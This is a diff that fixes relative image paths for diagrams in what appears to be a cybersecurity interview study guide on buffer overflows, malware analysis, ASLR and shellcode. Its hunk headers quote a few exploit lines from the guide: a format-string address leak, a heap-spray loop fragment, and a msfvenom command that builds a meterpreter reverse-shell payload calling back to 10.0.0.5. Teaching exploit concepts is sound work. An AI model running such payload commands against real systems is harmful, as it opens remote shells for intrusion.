-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-handwritten.svg" alt="Handwritten: What tools would you use for Windows malware analysis?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-handwritten.svg" alt="Handwritten: What tools would you use for Windows malware analysis?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-diagram.svg" alt="Diagram: What tools would you use for Windows malware analysis?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-diagram.svg" alt="Diagram: What tools would you use for Windows malware analysis?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-sticky.svg" alt="Sticky Note: What tools would you use for Windows malware analysis?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-tools-would-you-use-for-windows-malware-analysis-sticky.svg" alt="Sticky Note: What tools would you use for Windows malware analysis?" width="30%">
 </a>
 
 
@@ -2666,14 +2666,14 @@ Stage 1: Use format string `%p.%p.%p...` to leak stack values, identify a libc a
 
 ### OS Hardening Checklist
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-handwritten.svg" alt="Handwritten: OS Hardening Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-handwritten.svg" alt="Handwritten: OS Hardening Checklist" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-diagram.svg" alt="Diagram: OS Hardening Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-diagram.svg" alt="Diagram: OS Hardening Checklist" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-sticky.svg" alt="Sticky Note: OS Hardening Checklist" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/os-hardening-checklist-sticky.svg" alt="Sticky Note: OS Hardening Checklist" width="30%">
 </a>
 
 
@@ -2708,14 +2708,14 @@ Stage 1: Use format string `%p.%p.%p...` to leak stack values, identify a libc a
 
 ### Buffer Overflow Defenses Comparison
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-handwritten.svg" alt="Handwritten: Buffer Overflow Defenses Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-handwritten.svg" alt="Handwritten: Buffer Overflow Defenses Comparison" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-diagram.svg" alt="Diagram: Buffer Overflow Defenses Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-diagram.svg" alt="Diagram: Buffer Overflow Defenses Comparison" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-sticky.svg" alt="Sticky Note: Buffer Overflow Defenses Comparison" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/buffer-overflow-defenses-comparison-sticky.svg" alt="Sticky Note: Buffer Overflow Defenses Comparison" width="30%">
 </a>
 
 
@@ -2734,14 +2734,14 @@ Stage 1: Use format string `%p.%p.%p...` to leak stack values, identify a libc a
 
 ### Malware Types Comparison Table
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-handwritten.svg" alt="Handwritten: Malware Types Comparison Table" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-handwritten.svg" alt="Handwritten: Malware Types Comparison Table" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-diagram.svg" alt="Diagram: Malware Types Comparison Table" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-diagram.svg" alt="Diagram: Malware Types Comparison Table" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-sticky.svg" alt="Sticky Note: Malware Types Comparison Table" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/malware-types-comparison-table-sticky.svg" alt="Sticky Note: Malware Types Comparison Table" width="30%">
 </a>
 
 
@@ -2762,14 +2762,14 @@ Stage 1: Use format string `%p.%p.%p...` to leak stack values, identify a libc a
 
 ### Static vs Dynamic Analysis
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-handwritten.svg" alt="Handwritten: Static vs Dynamic Analysis" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-handwritten.svg" alt="Handwritten: Static vs Dynamic Analysis" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-diagram.svg" alt="Diagram: Static vs Dynamic Analysis" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-diagram.svg" alt="Diagram: Static vs Dynamic Analysis" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-sticky.svg" alt="Sticky Note: Static vs Dynamic Analysis" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/static-vs-dynamic-analysis-sticky.svg" alt="Sticky Note: Static vs Dynamic Analysis" width="30%">
 </a>
 
 
@@ -2791,14 +2791,14 @@ Stage 1: Use format string `%p.%p.%p...` to leak stack values, identify a libc a
 
 ### SSDLC Phases
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-handwritten.svg" alt="Handwritten: SSDLC Phases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-handwritten.svg" alt="Handwritten: SSDLC Phases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-diagram.svg" alt="Diagram: SSDLC Phases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-diagram.svg" alt="Diagram: SSDLC Phases" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-sticky.svg" alt="Sticky Note: SSDLC Phases" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/ssdlc-phases-sticky.svg" alt="Sticky Note: SSDLC Phases" width="30%">
 </a>
 
 
@@ -2817,14 +2817,14 @@ Stage 1: Use format string `%p.%p.%p...` to leak stack values, identify a libc a
 
 ### 1. Buffer Overflow Detector
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-handwritten.svg" alt="Handwritten: 1. Buffer Overflow Detector" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-handwritten.svg" alt="Handwritten: 1. Buffer Overflow Detector" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-diagram.svg" alt="Diagram: 1. Buffer Overflow Detector" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-diagram.svg" alt="Diagram: 1. Buffer Overflow Detector" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-sticky.svg" alt="Sticky Note: 1. Buffer Overflow Detector" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-detector-sticky.svg" alt="Sticky Note: 1. Buffer Overflow Detector" width="30%">
 </a>
 
 
@@ -2944,14 +2944,14 @@ console.log(JSON.stringify(findings, null, 2));
 
 ### 2. Malware Behavior Classifier
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-handwritten.svg" alt="Handwritten: 2. Malware Behavior Classifier" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-handwritten.svg" alt="Handwritten: 2. Malware Behavior Classifier" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-diagram.svg" alt="Diagram: 2. Malware Behavior Classifier" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-diagram.svg" alt="Diagram: 2. Malware Behavior Classifier" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-sticky.svg" alt="Sticky Note: 2. Malware Behavior Classifier" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-malware-behavior-classifier-sticky.svg" alt="Sticky Note: 2. Malware Behavior Classifier" width="30%">
 </a>
 
 
@@ -3113,14 +3113,14 @@ console.log('MITRE ATT&CK:', result.mitreMapping.join(' | '));
 
 ### 1. Buffer Overflow Attack Process
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-handwritten.svg" alt="Handwritten: 1. Buffer Overflow Attack Process" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-handwritten.svg" alt="Handwritten: 1. Buffer Overflow Attack Process" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-diagram.svg" alt="Diagram: 1. Buffer Overflow Attack Process" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-diagram.svg" alt="Diagram: 1. Buffer Overflow Attack Process" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-sticky.svg" alt="Sticky Note: 1. Buffer Overflow Attack Process" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/1-buffer-overflow-attack-process-sticky.svg" alt="Sticky Note: 1. Buffer Overflow Attack Process" width="30%">
 </a>
 
 
@@ -3164,14 +3164,14 @@ flowchart LR
 
 ### 2. Secure Software Development Lifecycle (SSDLC)
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-handwritten.svg" alt="Handwritten: 2. Secure Software Development Lifecycle (SSDLC)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-handwritten.svg" alt="Handwritten: 2. Secure Software Development Lifecycle (SSDLC)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-diagram.svg" alt="Diagram: 2. Secure Software Development Lifecycle (SSDLC)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-diagram.svg" alt="Diagram: 2. Secure Software Development Lifecycle (SSDLC)" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-sticky.svg" alt="Sticky Note: 2. Secure Software Development Lifecycle (SSDLC)" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/2-secure-software-development-lifecycle-ssdlc-sticky.svg" alt="Sticky Note: 2. Secure Software Development Lifecycle (SSDLC)" width="30%">
 </a>
 
 
@@ -3260,14 +3260,14 @@ flowchart LR
 
 ### Q13: Explain heap spraying as an exploitation technique.
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-handwritten.svg" alt="Handwritten: Explain heap spraying as an exploitation technique." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-handwritten.svg" alt="Handwritten: Explain heap spraying as an exploitation technique." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-diagram.svg" alt="Diagram: Explain heap spraying as an exploitation technique." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-diagram.svg" alt="Diagram: Explain heap spraying as an exploitation technique." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-sticky.svg" alt="Sticky Note: Explain heap spraying as an exploitation technique." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-heap-spraying-as-an-exploitation-technique-sticky.svg" alt="Sticky Note: Explain heap spraying as an exploitation technique." width="30%">
 </a>
 
 
@@ -3291,14 +3291,14 @@ while (spray.length < 500) {
 
 ### Q14: What is the difference between staged and stageless shellcode?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-handwritten.svg" alt="Handwritten: What is the difference between staged and stageless shellcode?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-handwritten.svg" alt="Handwritten: What is the difference between staged and stageless shellcode?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-diagram.svg" alt="Diagram: What is the difference between staged and stageless shellcode?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-diagram.svg" alt="Diagram: What is the difference between staged and stageless shellcode?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-sticky.svg" alt="Sticky Note: What is the difference between staged and stageless shellcode?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-the-difference-between-staged-and-stageless-shellcode-sticky.svg" alt="Sticky Note: What is the difference between staged and stageless shellcode?" width="30%">
 </a>
 
 
@@ -3323,14 +3323,14 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c
 
 ### Q15: How does ASLR differ between 32-bit and 64-bit Linux?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-handwritten.svg" alt="Handwritten: How does ASLR differ between 32-bit and 64-bit Linux?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-handwritten.svg" alt="Handwritten: How does ASLR differ between 32-bit and 64-bit Linux?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-diagram.svg" alt="Diagram: How does ASLR differ between 32-bit and 64-bit Linux?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-diagram.svg" alt="Diagram: How does ASLR differ between 32-bit and 64-bit Linux?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-sticky.svg" alt="Sticky Note: How does ASLR differ between 32-bit and 64-bit Linux?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/how-does-aslr-differ-between-32-bit-and-64-bit-linux-sticky.svg" alt="Sticky Note: How does ASLR differ between 32-bit and 64-bit Linux?" width="30%">
 </a>
 
 
@@ -3346,14 +3346,14 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c
 
 ### Q16: What is SEHOP and how does SafeSEH differ?
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-handwritten.svg" alt="Handwritten: What is SEHOP and how does SafeSEH differ?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-handwritten.svg" alt="Handwritten: What is SEHOP and how does SafeSEH differ?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-diagram.svg" alt="Diagram: What is SEHOP and how does SafeSEH differ?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-diagram.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-diagram.svg" alt="Diagram: What is SEHOP and how does SafeSEH differ?" width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-sticky.svg" alt="Sticky Note: What is SEHOP and how does SafeSEH differ?" width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-sticky.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/what-is-sehop-and-how-does-safeseh-differ-sticky.svg" alt="Sticky Note: What is SEHOP and how does SafeSEH differ?" width="30%">
 </a>
 
 
@@ -3368,14 +3368,14 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c
 
 ### Q17: Explain return-to-libc and when you would use it over a full ROP chain.
 
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-handwritten.svg" alt="Handwritten: Explain return-to-libc and when you would use it over a full ROP chain." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-handwritten.svg" target="_blank" rel="noopener">
+  <img src="../../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-handwritten.svg" alt="Handwritten: Explain return-to-libc and when you would use it over a full ROP chain." width="30%">
 </a>
-<a href="../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-diagram.svg" alt="Diagram: Explain return-to-libc and when you would use it over a full ROP chain." width="30%">
+<a href="../../../assets/images/diagrams/cyber-security/04-system-software/explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain-diagram.svg" target="_blank" rel="noopener">
